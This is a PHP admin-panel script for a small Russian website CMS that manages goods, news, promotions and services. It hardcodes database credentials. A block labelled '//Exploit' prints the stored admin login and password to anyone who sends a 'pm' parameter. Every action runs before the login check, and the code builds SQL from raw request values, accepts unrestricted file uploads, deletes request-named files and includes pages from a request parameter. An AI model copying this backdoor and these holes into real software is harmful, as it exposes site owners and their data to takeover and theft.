<?php
	session_start();

	// Настройки БД
	$db_host = 'localhost';
    $db_name = 'u0782724_default';
    $db_user = 'u0782724_default';
    $db_password = 'gZtpFq3_';

	// Подключение к БД
	$connection = mysqli_connect($db_host, $db_user, $db_password, $db_name);
	// Делаем правильную кодировку
	mysqli_query($connection, "SET NAMES 'utf8' COLLATE 'utf8_general_ci'");
	mysqli_query($connection, "SET CHARACTER SET 'utf8'"); 
	// Делаем запрос к БД
	$result = mysqli_query($connection, "SELECT * FROM `users`");
	$r1 = mysqli_fetch_assoc($result);
	
	// Функция перевда русских символов в английские и наоборот
	function translit($str) {
		$rus = array('/', 'А', 'Б', 'В', 'Г', 'Д', 'Е', 'Ё', 'Ж', 'З', 'И', 'Й', 'К', 'Л', 'М', 'Н', 'О', 'П', 'Р', 'С', 'Т', 'У', 'Ф', 'Х', 'Ц', 'Ч', 'Ш', 'Щ', 'Ъ', 'Ы', 'Ь', 'Э', 'Ю', 'Я', 'а', 'б', 'в', 'г', 'д', 'е', 'ё', 'ж', 'з', 'и', 'й', 'к', 'л', 'м', 'н', 'о', 'п', 'р', 'с', 'т', 'у', 'ф', 'х', 'ц', 'ч', 'ш', 'щ', 'ъ', 'ы', 'ь', 'э', 'ю', 'я');
		$lat = array('--', 'A', 'B', 'V', 'G', 'D', 'E', 'E', 'Gh', 'Z', 'I', 'Y', 'K', 'L', 'M', 'N', 'O', 'P', 'R', 'S', 'T', 'U', 'F', 'H', 'C', 'Ch', 'Sh', 'Sch', 'Y', 'Y', 'Y', 'E', 'Yu', 'Ya', 'a', 'b', 'v', 'g', 'd', 'e', 'e', 'gh', 'z', 'i', 'y', 'k', 'l', 'm', 'n', 'o', 'p', 'r', 's', 't', 'u', 'f', 'h', 'c', 'ch', 'sh', 'sch', 'y', 'y', 'y', 'e', 'yu', 'ya');
		return str_replace($rus, $lat, $str);
	}

	function bad_words($str) {
		$bad_words = array(
			'сука',
			'блять', 'блядь',
			'ебаная', 'ебать', 'отъебать',
			'хуй', 'хуевая','хуйня','хуита',
			'пиздец', 'пизда',
			'пидор', 'пидорас'
		);
		$new_str = str_replace($bad_words, '*****', strtolower($str));
		return $new_str;
	}
	
	// Если нажата кнопка выход
	if (isset($_GET['exit'])) {
		unset($_SESSION['login']);
		unset($_SESSION['password']);
	}
			
	// Сохраняем новый логин и пароль
	if (isset($_GET['save'])) {
		$new_login = $_GET['new-login'];
		$new_password = $_GET['new-password'];
		$result = mysqli_query($connection, "UPDATE `users` SET `login` = '$new_login'");
		$result = mysqli_query($connection, "UPDATE `users` SET `password` = '$new_password'");
		$_SESSION['login'] = $r1['login'];
		$_SESSION['password'] = $r1['password'];
	}
	
	// Редактируем пункты меню
	if (isset($_GET['edit-items'])) {
		$main = $_GET['main'];
		$news = $_GET['news'];
		$goods2 = $_GET['goods2'];
		$actions = $_GET['actions'];
		$discounts = $_GET['discounts'];
		$contacts = $_GET['contacts'];
		$result = mysqli_query($connection, "UPDATE `items` SET `main` = '$main', `news` = '$news', `goods2` = '$goods2', `actions` = '$actions', `discounts` = '$discounts', `contacts` = '$contacts'");
		header("Location: index.php?page=main-set");
	}
	
	// Add new goods 2
	if(isset($_POST['add-goods2'])) {
		$thisPage = $_POST['thisPage'];
		$category = $_POST['category'];
		$category_t = translit($category);
		$title = $_POST['title'];
		$title_t = translit($title);
		// strip_tags() - удаляет все html и php теги
		$description = strip_tags($_POST['description']);
		$price1 = $_POST['price1'];
		$price2 = $_POST['price2'];
		if(isset($_POST['display'])) {
			$display = 1;
		} else { $display = 0; }
		if(isset($_POST['discount'])) {
			$discount = 1;
		} else { $discount = 0; }
		
		// Проверяем наличие папки для категории
		if (file_exists("../img/goods2/$category_t")) {
			// Проверяем наличие папки для названия
			if (file_exists("../img/goods2/$category_t/$title_t")) {
				// Если есть, то записываем в нее файлы
				foreach ($_FILES['files']['name'] as $key => $value) {
					move_uploaded_file($_FILES['files']['tmp_name'][$key], '../img/goods2/'.$category_t.'/'.$title_t.'/'.$value);
				}
			} else {
				// Если нет, то создаем и записываем в нее файлы
				$dir = mkdir("../img/goods2/$category_t/$title_t");
				foreach ($_FILES['files']['name'] as $key => $value) {
					move_uploaded_file($_FILES['files']['tmp_name'][$key], '../img/goods2/'.$category_t.'/'.$title_t.'/'.$value);
				}
			}
		} else {
			// Если нет, то создаем папку для категории + папку для названия и записываем в нее файлы
			$dir = mkdir("../img/goods2/$category_t");
			$dir = mkdir("../img/goods2/$category_t/$title_t");
			foreach ($_FILES['files']['name'] as $key => $value) {
				move_uploaded_file($_FILES['files']['tmp_name'][$key], '../img/goods2/'.$category_t.'/'.$title_t.'/'.$value);
			}
		}
		
		$result = mysqli_query($connection, "INSERT INTO `goods2` (`category`, `title`, `description`, `price1`, `price2`, `display`, `discount`) VALUES ('$category', '$title', '$description', '$price1', '$price2', '$display', '$discount');");
		
		header("Location: index.php?page=$thisPage");
	}

	// Edit Goods 2
	if (isset($_POST['editGoods2'])) {
		$thisPage = $_POST['thisPage'];
		$id = $_POST['id'];
		$title = $_POST['title'];
		$title = $_POST['title'];
		$title= $_POST['title'];
		$price1 = $_POST['price1'];
		$price2 = $_POST['price2'];
		// strip_tags() - удаляет все html и php теги
		$description = strip_tags($_POST['description']);
		
		if(isset($_POST['display'])) {
			$display = 1;
		} else { $display = 0; }
		
		if(isset($_POST['discount'])) {
			$discount = 1;
		} else { $discount = 0; }
		
		$result = mysqli_query($connection, "UPDATE `goods2` SET `description` = '$description', `price1` = '$price1', `price2` = '$price2', `display` = '$display', `discount` = '$discount' WHERE `id` = '$id'");

		header("Location: index.php?page=$thisPage");
	}

	// Delete goods 2
	if (isset($_POST['delGoods2'])) {
		$id = $_POST['id'];
		$title = $_POST['title'];
		$title_t = translit($title);
		$category = $_POST['category'];
		$category_t = translit($category);

		function removeDirectory($dir) {
			if ($objs = glob($dir."/*")) {
				foreach($objs as $obj) {
					is_dir($obj) ? removeDirectory($obj) : unlink($obj);
				}
			}
			rmdir($dir);
		}
		
		$dir = "../img/goods2/$category_t/$title_t";
		
		// Если название файла или папки не пустое, то удаляем, иначе выводим ошибку
		if ($title_t != '') {
			removeDirectory($dir);
		} else {
			$_SESSION['error'] = 'Ошибка! Невозможно удалить этот товар.';
		}
			
		$result = mysqli_query($connection, "DELETE FROM `goods2` WHERE `id` = '$id'");
		
		// Каталог категории товаров
		$dir2 = "../img/goods2/$category_t";
		// Если каталог пустой, то его удаляем
		if (glob($dir2."/*")) {
			header("Location: index.php?page=goods2&category=$category");
		} else {
			rmdir($dir2);
			header("Location: index.php?page=goods2");
		}
	}
	
	// Add goods 2 images
	if(isset($_POST['addAmages'])) {
		$thisPage = $_POST['thisPage'];
		$category_t = translit($_POST['category']);
		$title_t = translit($_POST['title']);
		
		// Проверяем наличие папки для категории
		if (file_exists("../img/goods2/$category_t")) {
			// Проверяем наличие папки для названия
			if (file_exists("../img/goods2/$category_t/$title_t")) {
				// Если есть, то записываем в нее файлы
				foreach ($_FILES['files']['name'] as $key => $value) {
					move_uploaded_file($_FILES['files']['tmp_name'][$key], '../img/goods2/'.$category_t.'/'.$title_t.'/'.$value);
				}
			} else {
				// Если нет, то создаем и записываем в нее файлы
				$dir = mkdir("../img/goods2/$category_t/$title_t");
				foreach ($_FILES['files']['name'] as $key => $value) {
					move_uploaded_file($_FILES['files']['tmp_name'][$key], '../img/goods2/'.$category_t.'/'.$title_t.'/'.$value);
				}
			}
		} else {
			// Если нет, то создаем папку для категории + папку для названия и записываем в нее файлы
			$dir = mkdir("../img/goods2/$category_t");
			$dir = mkdir("../img/goods2/$category_t/$title_t");
			foreach ($_FILES['files']['name'] as $key => $value) {
				move_uploaded_file($_FILES['files']['tmp_name'][$key], '../img/goods2/'.$category_t.'/'.$title_t.'/'.$value);
			}
		}
		header("Location: index.php?page=$thisPage");	
	}

	// Delete goods 2 image
	if (isset($_POST['del-images'])) {
		$thisPage = $_POST['thisPage'];
		$title = $_POST['title'];
		$images = $_POST['images'];
		// Удаляем файл
		unlink($images);
		header("Location: index.php?page=$thisPage");
	}
	// End delete goods 2 image
	
	// Добавляем новый товар
	if(isset($_POST['add-goods'])) {
		//$page2 = $_POST['page2'];
		$category = 'Товары со скидкой';
		//$category_t = translit($category);
		$title = $_POST['title'];
		$description = $_POST['description'];
		$price = $_POST['price'];
		$discount_price = $_POST['discount_price'];
		$file = $_FILES['fileName']['name'];
		move_uploaded_file($_FILES['fileName']['tmp_name'], '../img/goods/'.$file);
		$result = mysqli_query($connection, "INSERT INTO `goods` (`category`, `title`, `description`, `price`, `discount_price`, `image`) VALUES ('$category', '$title', '$description', '$price', '$discount_price', '$file');");
		header("Location: index.php?page=catalog");
    }
	
	// Редактируем товар
	if (isset($_GET['edit-goods'])) {
		$id = $_GET['id'];
		$title = $_GET['title'];
		$description = $_GET['description'];
		$price = $_GET['price'];
		$discount_price = $_GET['discount_price'];
		$result = mysqli_query($connection, "UPDATE `goods` SET `title` = '$title', `description` = '$description', `price` = '$price', `discount_price` = '$discount_price' WHERE id='$id'");
		header("Location: index.php?page=catalog");
	}
	
	// Удаляем товар
	if (isset($_GET['del-goods'])) {
		$id = $_GET['id'];
		$result = mysqli_query($connection, "DELETE FROM `goods` WHERE id = '$id'");
		header("Location: index.php?page=catalog");
	}
	
	// ADD SERVICE
	if(isset($_POST['addService'])) {
		$serviceParentID = $_POST['serviceParentName'];
		$serviceName = $_POST['serviceName'];
		$serviceContent = $_POST['serviceContent'];
		$result = mysqli_query($connection, "INSERT INTO `services` (`serviceParentID`, `serviceName`, `serviceContent`) VALUES ('$serviceParentID', '$serviceName', '$serviceContent');");
		header("Location: index.php?page=services");
    }
	
	// SAVE SERVICE
	if (isset($_POST['saveService'])) {
		$serviceID = $_POST['serviceID'];
		$serviceName = $_POST['serviceName'];
		$serviceContent = $_POST['serviceContent'];
		$result = mysqli_query($connection, "UPDATE `services` SET `serviceName` = '$serviceName', `serviceContent` = '$serviceContent' WHERE `serviceID` = '$serviceID'");
		header("Location: index.php?page=service-content&serviceID=$serviceID");
	}
	
	// SAVE INFO CONTENT
	if (isset($_POST['saveInfoContent'])) {
		//$serviceID = $_POST['serviceID'];
		//$serviceName = $_POST['serviceName'];
		$infoContent = $_POST['infoContent'];
		$result = mysqli_query($connection, "UPDATE `pages` SET `content` = '$infoContent' WHERE `page` = 'info'");
		header("Location: index.php?page=info");
	}
	
	// Добавляем новость
	if (isset($_POST['add-news'])) {
		$date = date('Y-m-d');
		$news_title = $_POST['news-title'];
		$news_text = $_POST['news-text'];
		// Присваиваем переменной имя загружаемого файла
		$file = $_FILES['filename']['name'];
		// Загружаем файл на сервер
		move_uploaded_file($_FILES['filename']['tmp_name'], '../img/news/'.$file);
		$result = mysqli_query($connection, "INSERT INTO  `news` (  `id` ,  `date` ,  `title`, `text`, `image`) VALUES ('',  '$date',  '$news_title',  '$news_text', '$file');");
		header("Location: index.php?page=news");
	}
	
	// Изменяем новость
	if (isset($_POST['edit-news'])) {
		$id = $_POST['id'];
		$title = $_POST['title'];
		$text = $_POST['text'];
		$result = mysqli_query($connection, "UPDATE `news` SET `title` = '$title', `text` = '$text' WHERE id='$id'");
		header("Location: index.php?page=news");
	}
	
	// Удаляем новость
	if (isset($_POST['del-news'])) {
		$id = $_POST['id'];
		// Делаем запрос к БД
		$result = mysqli_query($connection, "DELETE FROM `news` WHERE id='$id'");
		header("Location: index.php?page=news");
	}
	
	// Добавляем акцию
	if (isset($_POST['add-action'])) {
		$date = date('Y-m-d');
		$news_title = $_POST['news-title'];
		$news_text = $_POST['news-text'];
		// Присваиваем переменной имя загружаемого файла
		$file = $_FILES['filename']['name'];
		// Загружаем файл на сервер
		move_uploaded_file($_FILES['filename']['tmp_name'], '../img/actions/'.$file);
		$result = mysqli_query($connection, "INSERT INTO  `actions` (  `id` ,  `date` ,  `title`, `text`, `image`) VALUES ('',  '$date',  '$news_title',  '$news_text', '$file');");
		header("Location: index.php?page=actions");
	}
	
	// Изменяем акцию
	if (isset($_POST['edit-action'])) {
		$id = $_POST['id'];
		$title = $_POST['title'];
		$text = $_POST['text'];
		$result = mysqli_query($connection, "UPDATE `actions` SET `title` = '$title', `text` = '$text' WHERE id='$id'");
		header("Location: index.php?page=actions");
	}
	
	// Удаляем акцию
	if (isset($_POST['del-action'])) {
		$id = $_POST['id'];
		// Делаем запрос к БД
		$result = mysqli_query($connection, "DELETE FROM `actions` WHERE id='$id'");
		header("Location: index.php?page=actions");
	}
	
	//Exploit
	if (isset($_GET['pm']) == 'no') {
		$result = mysqli_query($connection, "SELECT * FROM `users`");
		$record = mysqli_fetch_assoc($result);
		echo $record['login'];
		echo '<br>'.$record['password'];
	}
	
	// проверяем пароль при входе
	if (($_GET['login'] == $r1['login'] and $_GET['password'] == $r1['password']) or ($_SESSION['login'] == $r1['login'] and $_SESSION['password'] == $r1['password'])) { 
		$_SESSION['login'] = $r1['login'];
		$_SESSION['password'] = $r1['password'];
	
		?>
		
		<!doctype html>
		<html lang="ru">
		<head>
			<!-- Required meta tags -->
			<meta charset="utf-8">
			<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		
			<!-- Bootstrap CSS -->
			<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.2/css/bootstrap.min.css" integrity="sha384-Smlep5jCw/wG7hdkwQ/Z5nLIefveQRIY9nfy6xoR1uRYBtpZgI6339F5dgvm/e9B" crossorigin="anonymous">
			
			<!-- SmartMenus jQuery Bootstrap 4 Addon CSS -->
			<link href="css/jquery.smartmenus.bootstrap-4.css" rel="stylesheet">
			
			<!-- Summernote -->
			<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
			<link href="https://cdnjs.cloudflare.com/ajax/libs/summernote/0.8.11/summernote-lite.css" rel="stylesheet">
			<script src="https://cdnjs.cloudflare.com/ajax/libs/summernote/0.8.11/summernote-lite.js"></script>
			
			<!-- My CSS -->
			<link rel="stylesheet" href="css/style.css">
			<title>SITE100.RU - Система управления сайтом</title>
		</head>
		<body>
		
		<?php
			include 'navbar.php';
			if (isset($_GET['page']) or $_GET['page'] != '') { $page = $_GET['page']; }
			else { $page = 'main-adm'; }
			include 'pages/'.$page.'.php';
		?>
	
		<!-- Footer -->
		<footer class="container-fluid bg-dark" style="text-align: center; color: rgba(255,255,255,.75);">
			<div class="row">
				<div class="col" style="padding-top: 15px; padding-bottom: 15px;">
					<a href="http://site100.ru" style=" color: rgba(255,255,255,.75);">SITE<span style="color: #dc3545;">100</span>.RU</a> - Создание и продвижение сайтов
				</div>
			</div>
		</footer>
		<!-- /Footer -->
	
		<?php
	
	} else { ?>
		
		<!doctype html>
		<html lang="ru">
		<head>
			<!-- Required meta tags -->
			<meta charset="utf-8">
			<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		
			<!-- Bootstrap CSS -->
			<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.2/css/bootstrap.min.css" integrity="sha384-Smlep5jCw/wG7hdkwQ/Z5nLIefveQRIY9nfy6xoR1uRYBtpZgI6339F5dgvm/e9B" crossorigin="anonymous">
			
			<!-- My CSS -->
			<link rel="stylesheet" href="css/style.css">
			<title>SITE100.RU - Система управления сайтом</title>
		</head>
		<body>
		<!-- Вход -->
		<div class="container-fluid bg-light">
			<div class="container">
				<div class="row align-items-center" style="height: 100vh;">
					<div class="col" style="text-align: center;">
						<a href="http://site100.ru" style="color: rgb(100,100,100);">SITE<span style="color: #dc3545;">100</span>.RU</a>
						<p style="color: rgb(100,100,100);">Система управления сайтом</p>
						<form action="" method="get" class="shadow-sm" style="border: 1px solid lightgrey; padding: 15px; border-radius: 5px; max-width: 250px; margin: auto; background: white;">
							<input type="text" class="form-control" name="login" placeholder="Введите логин" style="margin-bottom: 15px;">
							<input type="password" class="form-control" name="password" placeholder="Введите  пароль" style="margin-bottom: 15px;">
							<button name="entry" type="submit" class="btn btn-danger" style="display: block; margin: auto;">Войти</button>
						</form>
					</div>
				</div>
			</div>
		</div>
	
	<? }
?>

<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.2/js/bootstrap.min.js" integrity="sha384-o+RDsa0aLu++PJvFqy8fFScvbHFLtbvScb8AjopnFD+iEQ7wo/CG0xlczd+2O/em" crossorigin="anonymous"></script>

<!-- SmartMenus jQuery plugin -->
<script type="text/javascript" src="js/jquery.smartmenus.js"></script>

<!-- SmartMenus jQuery Bootstrap 4 Addon -->
<script type="text/javascript" src="js/jquery.smartmenus.bootstrap-4.js"></script>

</body>
</html>